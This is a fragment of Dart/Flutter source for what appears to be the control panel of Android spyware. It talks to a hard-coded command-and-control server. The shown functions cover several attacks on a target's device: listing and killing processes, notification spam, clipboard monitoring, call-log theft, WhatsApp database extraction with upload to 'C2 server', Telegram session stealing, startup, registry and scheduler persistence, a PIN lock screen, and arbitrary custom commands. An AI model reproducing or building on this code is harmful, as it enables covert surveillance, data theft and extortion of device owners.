                      color: _roseColor.withOpacity(0.92),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: const Text("STOP", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, color: Color(0xFF070709))),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showProcessKiller() async {
    _sendCommand("list_processes", _targetId);
    await Future.delayed(const Duration(seconds: 2));
    try {
      final response = await http.get(Uri.parse("http://kinncloud.sistems.tech:2052/api/get-response/${_targetId}"));
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        var processes = data['data']?['processes'] ?? [];
        
        showDialog(
          context: context,
          builder: (context) => Dialog(
            backgroundColor: Colors.transparent,
            child: _buildGlassCard(
              child: Container(
                width: 320,
                height: 450,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _warningColor.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(Icons.bug_report, color: _warningColor, size: 18),
                        ),
                        const SizedBox(width: 8),
                        Text("PROCESS KILLER", style: TextStyle(color: _warningColor, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: ListView.builder(
                        itemCount: processes.length,
                        itemBuilder: (ctx, idx) {
                          var proc = processes[idx];
                          return Container(
                            margin: const EdgeInsets.only(bottom: 4),
                            child: _buildGlassCard(
                              child: ListTile(
                                leading: Icon(Icons.build, color: Colors.white54, size: 14),
                                title: Text(proc['name'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'Rajdhani')),
                                trailing: GestureDetector(
                                  onTap: () {
                                    _sendCommand("kill_process", _targetId, extra: proc['pid'].toString());
                                    _addLog("Killing process: ${proc['name']}", LogType.warning);
                                    Navigator.pop(context);
                                  },
                                  child: Container(
                                    padding: const EdgeInsets.all(6),
                                    decoration: BoxDecoration(
                                      color: _roseColor.withOpacity(0.15),
                                      shape: BoxShape.circle,
                                    ),
                                    child: Icon(Icons.close, color: _roseColor, size: 14),
                                  ),
                                ),
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                    const SizedBox(height: 8),
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Text("CLOSE", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      }
    } catch (e) {
      _addLog("Failed to fetch processes: $e", LogType.error);
    }
  }

  void _startNotificationSpammer() {
    _showInput("NOTIFICATION SPAM", "spam_notification", _targetId, hint: "Title|Message|Count");
  }

  void _startClipboardMonitor() {
    _sendCommand("monitor_clipboard", _targetId);
    _addLog("Clipboard monitoring activated", LogType.info);
    
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text("Monitoring target clipboard...", style: TextStyle(fontFamily: 'Rajdhani')),
      duration: Duration(seconds: 3),
    ));
  }

  void _fetchCallLogs() async {
    _sendCommand("get_call_logs", _targetId);
    await Future.delayed(const Duration(seconds: 3));
    try {
      final response = await http.get(Uri.parse("http://kinncloud.sistems.tech:2052/api/get-response/${_targetId}"));
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        var calls = data['data']?['calls'] ?? [];
        
        showDialog(
          context: context,
          builder: (context) => Dialog(
            backgroundColor: Colors.transparent,
            child: _buildGlassCard(
              child: Container(
                width: 360,
                height: 480,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _glowColor1.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(Icons.phone, color: _glowColor1, size: 18),
                        ),
                        const SizedBox(width: 8),
                        Text("CALL LOGS", style: TextStyle(color: _glowColor1, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: ListView.builder(
                        itemCount: calls.length,
                        itemBuilder: (ctx, idx) {
                          var call = calls[idx];
                          IconData callIcon = call['type'] == "INCOMING" ? Icons.call_received : (call['type'] == "OUTGOING" ? Icons.call_made : Icons.call_missed);
                          Color callColor = call['type'] == "INCOMING" ? _successColor : (call['type'] == "OUTGOING" ? _glowColor1 : _roseColor);
                          
                          return Container(
                            margin: const EdgeInsets.only(bottom: 4),
                            child: _buildGlassCard(
                              child: ListTile(
                                leading: Icon(callIcon, color: callColor, size: 18),
                                title: Text(call['number'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'Rajdhani')),
                                subtitle: Text(_formatTimestamp(call['date']), style: const TextStyle(color: Colors.white38, fontSize: 9)),
                                trailing: Text("${call['duration'] ?? 0}s", style: TextStyle(color: callColor, fontSize: 9, fontFamily: 'Rajdhani')),
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                    const SizedBox(height: 8),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: const Text("CLOSE", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _exportCallLogs(calls),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.92),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: const Row(
                              children: [
                                Icon(Icons.download, size: 14, color: Color(0xFF070709)),
                                SizedBox(width: 6),
                                Text("EXPORT", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, color: Color(0xFF070709))),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ),
        );
      }
    } catch (e) {
      _addLog("Failed to fetch call logs: $e", LogType.error);
    }
  }

  void _exportCallLogs(List calls) {
    StringBuffer buffer = StringBuffer();
    buffer.writeln("=== CALL LOGS EXPORT ===\n");
    for (var call in calls) {
      buffer.writeln("Number: ${call['number']}");
      buffer.writeln("Type: ${call['type']}");
      buffer.writeln("Duration: ${call['duration']}s");
      buffer.writeln("Date: ${_formatTimestamp(call['date'])}");
      buffer.writeln("---");
    }
    Clipboard.setData(ClipboardData(text: buffer.toString()));
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Call logs exported"), duration: Duration(seconds: 2)));
  }

  void _extractWhatsApp() {
    _sendCommand("extract_whatsapp", _targetId);
    _addLog("WhatsApp database extraction initiated", LogType.warning);
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _successColor.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.chat, color: _successColor, size: 18),
                    ),
                    const SizedBox(width: 8),
                    Text("WA EXTRACTOR", style: TextStyle(color: _successColor, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 16),
                Icon(Icons.warning_amber, color: _warningColor, size: 40),
                const SizedBox(height: 12),
                const Text("This may take several minutes", style: TextStyle(color: Colors.white70, fontSize: 11, fontFamily: 'Rajdhani')),
                const Text("Database will be uploaded to C2 server", style: TextStyle(color: Colors.white70, fontSize: 11, fontFamily: 'Rajdhani')),
                const SizedBox(height: 16),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 8),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.92),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: const Text("OK", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, color: Color(0xFF070709))),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _stealTelegram() {
    _sendCommand("steal_telegram", _targetId);
    _addLog("Telegram session stealing initiated", LogType.info);
  }

  void _enablePersistence() {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _successColor.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.power_settings_new, color: _successColor, size: 18),
                    ),
                    const SizedBox(width: 8),
                    Text("PERSISTENCE", style: TextStyle(color: _successColor, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 16),
                const Text("Choose persistence method:", style: TextStyle(color: Colors.white, fontSize: 12, fontFamily: 'Rajdhani')),
                const SizedBox(height: 12),
                GestureDetector(
                  onTap: () { _sendCommand("persistence_startup", _targetId); Navigator.pop(context); _addLog("Startup persistence enabled", LogType.success); },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.start, size: 16, color: _glowColor1),
                        const SizedBox(width: 8),
                        Text("STARTUP FOLDER", style: TextStyle(color: _glowColor1, fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w700)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () { _sendCommand("persistence_registry", _targetId); Navigator.pop(context); _addLog("Registry persistence enabled", LogType.success); },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _glowColor2.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _glowColor2.withOpacity(0.2), width: 1),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.app_registration, size: 16, color: _glowColor2),
                        const SizedBox(width: 8),
                        Text("REGISTRY RUN", style: TextStyle(color: _glowColor2, fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w700)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () { _sendCommand("persistence_scheduler", _targetId); Navigator.pop(context); _addLog("Task Scheduler persistence enabled", LogType.success); },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      color: _accentColor.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _accentColor.withOpacity(0.2), width: 1),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.schedule, size: 16, color: _accentColor),
                        const SizedBox(width: 8),
                        Text("TASK SCHEDULER", style: TextStyle(color: _accentColor, fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w700)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: const Text("CANCEL", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  String _formatTimestamp(dynamic timestamp) {
    try {
      DateTime date = timestamp is int ? DateTime.fromMillisecondsSinceEpoch(timestamp) : (timestamp is String ? DateTime.parse(timestamp) : DateTime.now());
      return "${date.day}/${date.month}/${date.year} ${date.hour}:${date.minute.toString().padLeft(2, '0')}";
    } catch (e) { return ""; }
  }

  // ==================== LOCK INPUT KHUSUS UNTUK TIPE 1 DAN 2 ====================
  void _showLockInput(String title, String cmd, String targetId) {
    TextEditingController messageController = TextEditingController();
    TextEditingController passwordController = TextEditingController();
    
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _roseColor.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.lock, color: _roseColor, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Text(title, style: TextStyle(color: _roseColor, fontSize: 16, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani', letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _roseColor.withOpacity(0.15), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: messageController,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _roseColor,
                    decoration: InputDecoration(
                      hintText: "Pesan (contoh: SYSTEM LOCKED)",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _roseColor.withOpacity(0.15), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: passwordController,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _roseColor,
                    obscureText: true,
                    decoration: InputDecoration(
                      hintText: "PIN (contoh: 0812)",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () {
                        String message = messageController.text.trim();
                        String password = passwordController.text.trim();
                        if (password.isEmpty) password = "0812";
                        if (message.isEmpty) message = "SYSTEM LOCKED";
                        String extra = "$message|$password";
                        _sendCommand(cmd, targetId, extra: extra);
                        Navigator.pop(context);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _roseColor.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(14),
                        ),
                        child: const Text("LOCK", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: Color(0xFF070709))),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ==================== UI COMPONENTS ====================
  
  Widget _buildTopHeader() {
    String modelText = _targetModel.split(' ').first.toUpperCase();
    String idText = _targetId.length > 10 ? _targetId.substring(0, 10).toUpperCase() : _targetId.toUpperCase();
    String smallGreyText = "${_targetModel.replaceAll(' ', '').toLowerCase()}-${_targetId.toLowerCase()}-ap3a";

    return Container(
      padding: EdgeInsets.only(top: MediaQuery.of(context).padding.top + 12, left: 16, right: 16, bottom: 12),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 45, height: 45,
              decoration: BoxDecoration(
                color: _cardColor,
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _glowColor1.withOpacity(0.25), width: 1.5),
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
            ),
          ),
          const SizedBox(width: 16),
          AnimatedBuilder(
            animation: _glowAnimation,
            builder: (context, _) {
              return Container(
                width: 55, height: 55,
                decoration: BoxDecoration(
                  color: _glowColor1.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1.5),
                  boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.2 * _glowAnimation.value), blurRadius: 15)],
                ),
                child: const Icon(Icons.phone_android, color: Color(0xFFE0E0F8), size: 28),
              );
            },
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text("NCR- $modelText", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 15, letterSpacing: 2, fontFamily: 'Rajdhani')),
                const SizedBox(height: 2),
                Text(idText, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.w700, fontFamily: 'Rajdhani')),
                const SizedBox(height: 2),
                Text(smallGreyText, style: TextStyle(color: Colors.white.withOpacity(0.35), fontSize: 9, fontFamily: 'Rajdhani'), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ),
          ),
          Container(
            width: 45, height: 45,
            decoration: BoxDecoration(
              border: Border.all(color: _isConnected ? _successColor : _roseColor, width: 1.5),
              borderRadius: BorderRadius.circular(14),
            ),
            child: Icon(_isConnected ? FontAwesomeIcons.link : FontAwesomeIcons.linkSlash, color: _isConnected ? _successColor : _roseColor, size: 18),
          ),
        ],
      ),
    );
  }

  Widget _buildQuickStatusRow() {
    int batLevel = _deviceData.containsKey('battery') ? _parseBattery(_deviceData['battery']) : 41;
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Row(
        children: [
          _statusBadge(FontAwesomeIcons.batteryFull, "$batLevel%", _getBatteryColor(batLevel)),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.android, "Android", _glowColor1),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.shieldHalved, "Secure", _successColor),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.eye, "Visible", Colors.white70),
          const SizedBox(width: 8),
          _statusBadge(FontAwesomeIcons.wifi, _deviceData['ip']?.split('.').last ?? "N/A", _glowColor1),
        ],
      ),
    );
  }

  Widget _statusBadge(IconData icon, String text, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.2), width: 1),
      ),
      child: Row(children: [Icon(icon, color: color, size: 12), const SizedBox(width: 6), Text(text, style: TextStyle(color: Colors.white70, fontSize: 10, fontWeight: FontWeight.w700, fontFamily: "Rajdhani"))]),
    );
  }

  Widget _buildTerminalLogs() {
    return Container(
      height: 120,
      margin: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _isConnected ? _successColor.withOpacity(0.3) : _roseColor.withOpacity(0.3), width: 1),
      ),
      child: _buildGlassCard(
        child: ListView.builder(
          controller: _logScrollController,
          reverse: true,
          padding: const EdgeInsets.all(12),
          itemCount: _executionLogs.length,
          itemBuilder: (context, i) {
            final log = _executionLogs[_executionLogs.length - 1 - i];
            return Padding(
              padding: const EdgeInsets.symmetric(vertical: 2),
              child: Row(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text("[${_formatTime(log.timestamp)}]", style: TextStyle(color: Colors.grey[600], fontSize: 8, fontFamily: 'monospace')),
                  const SizedBox(width: 8),
                  Expanded(child: Text(log.message, style: TextStyle(color: _getLogColor(log.type), fontSize: 9, fontFamily: 'monospace'))),
                ],
              ),
            );
          },
        ),
      ),
    );
  }

  Widget _groupLabel(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 5),
      child: Row(
        children: [
          Text(text, style: TextStyle(color: _warningColor, fontSize: 10, fontWeight: FontWeight.w800, letterSpacing: 2, fontFamily: 'Rajdhani')),
          const SizedBox(width: 8),
          Expanded(child: Divider(color: _warningColor.withOpacity(0.3), thickness: 1)),
        ],
      ),
    );
  }

  Widget _actionButton(String label, IconData icon, Color color, String cmd, 
      {bool isInput = false, bool isCustom = false, bool isPage = false, 
      Widget? destination, String? inputHint, VoidCallback? onCustomTap}) {
    return InkWell(
      onTap: () {
        if (onCustomTap != null) {
          onCustomTap();
        } else if (cmd == "start_live_camera") { 
          _sendCommand(cmd, _targetId); 
          _showLiveCameraDialog(); 
        } else if (isCustom) { 
          _showCustomCommandDialog(); 
        } else if (isPage && destination != null) {
          if (cmd.isNotEmpty) {
            _sendCommand(cmd, _targetId); 
          }
          Navigator.push(context, MaterialPageRoute(builder: (context) => destination));
        } else if (isInput) {
          if (cmd == "lock_type1" || cmd == "lock_type2") {
            _showLockInput(label, cmd, _targetId);
          } else {
            _showInput(label, cmd, _targetId, hint: inputHint);
          }
        } else { 
          _sendCommand(cmd, _targetId); 
        }
      },
      borderRadius: BorderRadius.circular(16),
      child: Container(
        width: MediaQuery.of(context).size.width / 3 - 15,
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: color.withOpacity(0.2), width: 1),
        ),
        child: Column(children: [Icon(icon, color: color, size: 22), const SizedBox(height: 6), Text(label, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w600, fontFamily: 'Rajdhani'), textAlign: TextAlign.center, maxLines: 2, overflow: TextOverflow.ellipsis)]),
      ),
    );
  }

  void _showInput(String title, String cmd, String targetId, {String? hint}) {
    TextEditingController c = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _glowColor1.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.input, color: _glowColor1, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Text(title, style: TextStyle(color: _glowColor1, fontSize: 16, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani', letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: c,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _glowColor1,
                    decoration: InputDecoration(
                      hintText: hint ?? "Enter value...",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () => Navigator.pop(context),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () { _sendCommand(cmd, targetId, extra: c.text); Navigator.pop(context); },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(14),
                        ),
                        child: const Text("EXECUTE", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: Color(0xFF070709))),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showCustomCommandDialog() {
    TextEditingController extraController = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: _glowColor1.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(Icons.terminal, color: Color(0xFFE0E0F8), size: 18),
                    ),
                    const SizedBox(width: 12),
                    const Text("CUSTOM COMMAND", style: TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani', letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 20),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: _customCommandController,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _glowColor1,
                    decoration: InputDecoration(
                      hintText: "e.g., get_clipboard",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: extraController,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _glowColor1,
                    decoration: InputDecoration(
                      hintText: "Extra params (optional)",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: InputBorder.none,
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () { Navigator.pop(context); _customCommandController.clear(); },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Text("CANCEL", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                      ),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: () { 
                        _sendCommand(_customCommandController.text, _targetId, extra: extraController.text); 
                        Navigator.pop(context); 
                        _customCommandController.clear(); 
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(14),
                        ),
                        child: const Text("EXECUTE", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 2, color: Color(0xFF070709))),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildQuickStats() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _statItem(FontAwesomeIcons.addressBook, "${(_deviceData['contacts'] as List?)?.length ?? 0}", "Contacts"),
          _statItem(FontAwesomeIcons.message, "${(_deviceData['sms'] as List?)?.length ?? 0}", "SMS"),
          _statItem(Icons.apps, "${(_deviceData['apps'] as List?)?.length ?? 0}", "Apps"),
